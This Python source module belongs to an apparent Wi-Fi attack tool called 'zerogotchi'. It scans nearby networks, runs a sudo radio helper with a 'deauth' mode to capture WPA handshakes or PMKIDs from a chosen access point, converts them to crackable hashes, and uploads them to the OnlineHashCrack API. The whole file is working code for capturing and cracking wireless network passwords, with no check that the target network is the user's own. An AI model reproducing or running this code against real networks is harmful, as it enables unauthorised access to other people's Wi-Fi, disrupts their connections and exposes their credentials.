"""Wi-Fi discovery, capture storage, and OnlineHashCrack submission."""

import json
import os
from pathlib import Path
import re
import subprocess
import tempfile
import time
from dataclasses import dataclass
from urllib.error import HTTPError, URLError
from urllib.request import Request, urlopen


API_URL = "https://api.onlinehashcrack.com/v2"
KEY_PATTERN = re.compile(r"sk_[A-Za-z0-9]{32,64}")
MAC_PATTERN = re.compile(r"(?:[0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}")
CONFIG = Path(os.environ.get("XDG_CONFIG_HOME") or Path.home() / ".config") / "zerogotchi"
CAPTURES = Path(os.environ.get("XDG_DATA_HOME") or Path.home() / ".local/share") / "zerogotchi/captures"
HELPER = "/usr/lib/zerogotchi/radio"


class WifiError(Exception):
    pass


@dataclass(frozen=True)
class Network:
    bssid: str
    ssid: str
    frequency: int
    signal: int
    security: str


def split_nmcli(line):
    fields = [""]
    escaped = False
    for char in line:
        if escaped:
            fields[-1] += char
            escaped = False
        elif char == "\\":
            escaped = True
        elif char == ":":
            fields.append("")
        else:
            fields[-1] += char
    return fields


def scan():
    try:
        result = subprocess.run(
            ["nmcli", "-t", "-e", "yes", "-f", "BSSID,SSID,FREQ,SIGNAL,SECURITY",
             "device", "wifi", "list", "--rescan", "yes"],
            env={**os.environ, "LC_ALL": "C"}, capture_output=True, text=True,
            errors="replace", timeout=20, check=True,
        )
    except (subprocess.SubprocessError, OSError) as error:
        raise WifiError("Wi-Fi scan failed") from error

    by_bssid = {}
    for line in result.stdout.splitlines():
        fields = split_nmcli(line)
        if len(fields) != 5 or not MAC_PATTERN.fullmatch(fields[0]):
            continue
        bssid, ssid, freq, signal, security = fields
        try:
            network = Network(bssid.upper(), ssid, int(freq.split()[0]), int(signal), security)
        except (ValueError, IndexError):
            continue
        if network.bssid not in by_bssid or network.signal > by_bssid[network.bssid].signal:
            by_bssid[network.bssid] = network
    return sorted(by_bssid.values(), key=lambda network: -network.signal)


def read_setting(name):
    path = CONFIG / name
    try:
        return path.read_text(encoding="ascii").strip()
    except (OSError, UnicodeError):
        return ""


def save_setting(name, value):
    CONFIG.mkdir(mode=0o700, parents=True, exist_ok=True)
    with tempfile.NamedTemporaryFile(dir=CONFIG, mode="w", encoding="ascii", delete=False) as output:
        temporary = Path(output.name)
        try:
            output.write(value + "\n")
            output.flush()
            os.fsync(output.fileno())
            temporary.replace(CONFIG / name)
        finally:
            temporary.unlink(missing_ok=True)


def extract_hashes(pcap, bssid, output, timeout):
    output.unlink(missing_ok=True)
    subprocess.run(
        ["hcxpcapngtool", "-o", str(output), str(pcap)],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=timeout, check=True,
    )
    if not output.exists():
        return []
    return list(dict.fromkeys(
        line for line in output.read_text(encoding="ascii").splitlines()
        if (fields := line.split("*"))[:2] in (["WPA", "01"], ["WPA", "02"])
        and len(fields) > 3 and fields[3].lower() == bssid
    ))


def hash_kind(hashes):
    return "WPA handshake" if any(line.startswith("WPA*02*") for line in hashes) else "PMKID"


def capture(network, interface, mode, password, cancel, report):
    if not interface:
        raise WifiError("Set capture adapter in Settings")
    bssid = network.bssid.replace(":", "").lower()
    folder = None
    if mode != "deauth":
        CAPTURES.mkdir(mode=0o700, parents=True, exist_ok=True)
        folder = Path(tempfile.mkdtemp(prefix=bssid.upper() + "-", dir=CAPTURES))
    pcap = folder / "capture.pcap" if folder else None
    prompt = b"ZEROGOTCHI_SUDO:"
    args = ["sudo", "-Sk", "-p", prompt.decode(), "--", HELPER,
            interface, str(network.frequency), network.bssid, mode]
    hashes = []
    try:
        with (
            open(pcap or os.devnull, "xb" if pcap else "wb") as output,
            tempfile.TemporaryFile() as errors,
            tempfile.TemporaryDirectory() as scratch,
        ):
            if pcap:
                os.fchmod(output.fileno(), 0o600)
            probe = Path(scratch) / "probe.22000"
            process = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=output, stderr=errors)
            with process:
                try:
                    process.stdin.write(password.encode() + b"\n")
                    process.stdin.flush()
                except BrokenPipeError:
                    pass
                started = time.monotonic()
                next_probe = started + 2
                scanned_size = 0
                radio = "Preparing USB adapter…"
                try:
                    while process.poll() is None and not cancel.wait(0.2):
                        if os.pread(errors.fileno(), 4096, 0).count(prompt) > 1:
                            break
                        now = time.monotonic()
                        end = os.fstat(errors.fileno()).st_size
                        tail = os.pread(errors.fileno(), 4096, max(0, end - 4096))
                        statuses = [line[10:] for line in tail.decode(errors="replace").splitlines()
                                    if line.startswith("ZG STATUS ")]
                        if statuses:
                            radio = statuses[-1].replace(" | ", "\n")
                        size = os.fstat(output.fileno()).st_size if pcap else 0
                        state = f"\nCaptured: {size // 1024} KiB\nWaiting for handshake or PMKID" if pcap else ""
                        report(f"{int(now-started)}s elapsed\n{radio}{state}")
                        if pcap and size > max(24, scanned_size) and now >= next_probe:
                            scanned_size, next_probe = size, now + 3
                            try:
                                hashes = extract_hashes(pcap, bssid, probe, timeout=5)
                            except (OSError, UnicodeError, subprocess.SubprocessError):
                                # The capture can grow while the converter reads its final record.
                                continue
                            if hashes:
                                report(hash_kind(hashes) + " captured. Saving files…")
                                break
                finally:
                    try:
                        process.stdin.close()
                    except BrokenPipeError:
                        pass
                status = process.wait()
            end = os.fstat(errors.fileno()).st_size
            detail = os.pread(errors.fileno(), 8192, max(0, end - 8192)).decode(errors="replace")
        if status:
            error = next((line.removeprefix("ZEROGOTCHI: ").strip()
                          for line in detail.splitlines() if "ZEROGOTCHI: " in line), "")
            if prompt.decode() in detail and not error:
                error = "User password authentication failed"
            if pcap and pcap.stat().st_size > 24:
                (folder / "network.json").write_text(json.dumps({"ssid": network.ssid}), encoding="utf-8")
                error = (error or "Capture interrupted") + ". PCAP saved."
            raise WifiError(error or "Radio session failed")
        if not pcap:
            return None, None, ""
        if pcap.stat().st_size <= 24:
            raise WifiError("Stopped. No packets were captured.")
        (folder / "network.json").write_text(json.dumps({"ssid": network.ssid}), encoding="utf-8")
        if not hashes:
            with tempfile.TemporaryDirectory() as scratch:
                try:
                    hashes = extract_hashes(pcap, bssid, Path(scratch) / "final.22000", timeout=15)
                except (OSError, UnicodeError, subprocess.SubprocessError) as error:
                    raise WifiError("Hash conversion failed. PCAP saved.") from error
        if not hashes:
            return pcap, None, ""
        hashfile = pcap.with_suffix(".22000")
        hashfile.write_text("\n".join(hashes) + "\n", encoding="ascii")
        return pcap, hashfile, hash_kind(hashes)
    except (OSError, subprocess.SubprocessError) as error:
        raise WifiError("Radio session failed. Check adapter and permissions") from error
    finally:
        if pcap and (not pcap.exists() or pcap.stat().st_size <= 24):
            pcap.unlink(missing_ok=True)
            folder.rmdir()


def capture_name(path):
    try:
        ssid = json.loads((path.parent / "network.json").read_text(encoding="utf-8"))["ssid"]
    except (OSError, ValueError, KeyError):
        # Older captures contain the AP beacon but have no saved metadata.
        raw_bssid = path.parent.name.split("-")[0]
        bssid = ":".join(raw_bssid[i:i + 2] for i in range(0, len(raw_bssid), 2))
        try:
            result = subprocess.run(
                ["tcpdump", "-nn", "-r", str(path), "-c", "1",
                 f"type mgt subtype beacon and wlan addr2 {bssid}"],
                capture_output=True, text=True, errors="replace", timeout=2,
            )
            match = re.search(r"Beacon \((.*?)\)", result.stdout)
            ssid = match[1] if match else ""
        except (OSError, subprocess.SubprocessError):
            ssid = ""
    return "".join(char if char.isprintable() else " " for char in ssid) or "(unknown or hidden network)"


def saved_captures():
    return sorted(CAPTURES.glob("*/capture.pcap"), key=lambda path: path.stat().st_mtime, reverse=True)


def upload(path):
    key = read_setting("api-key")
    if not KEY_PATTERN.fullmatch(key):
        raise WifiError("Set your API key in Settings")
    hashes = list(dict.fromkeys(
        line for line in path.read_text(encoding="ascii").splitlines()
        if line.startswith(("WPA*01*", "WPA*02*"))
    ))
    if not hashes:
        raise WifiError("No WPA hashes to submit")

    accepted = skipped = rejected = 0
    for offset in range(0, len(hashes), 50):
        payload = {
            "api_key": key, "agree_terms": "yes", "action": "add_tasks",
            "algo_mode": 22000, "hashes": hashes[offset:offset + 50],
        }
        request = Request(API_URL, json.dumps(payload).encode(),
                          headers={"Content-Type": "application/json"})
        try:
            with urlopen(request, timeout=15) as response:
                result = json.load(response)
        except HTTPError as error:
            try:
                result = json.load(error)
            except (ValueError, OSError):
                result = {}
            request_id = str(result.get("request_id", ""))[:32]
            if error.code == 429:
                raise WifiError("Rate limited. Retry later. " + request_id) from error
            raise WifiError(f"OnlineHashCrack HTTP {error.code}. {request_id}") from error
        except (URLError, OSError, ValueError) as error:
            raise WifiError("OnlineHashCrack connection failed") from error
        if not result.get("success"):
            raise WifiError("OnlineHashCrack rejected request " + str(result.get("request_id", ""))[:32])
        accepted += result.get("accepted", {}).get("count", 0)
        skipped += result.get("skipped", {}).get("count", 0)
        rejected += result.get("rejected", {}).get("count", 0)
    return f"Accepted {accepted}. Skipped {skipped}. Rejected {rejected}."
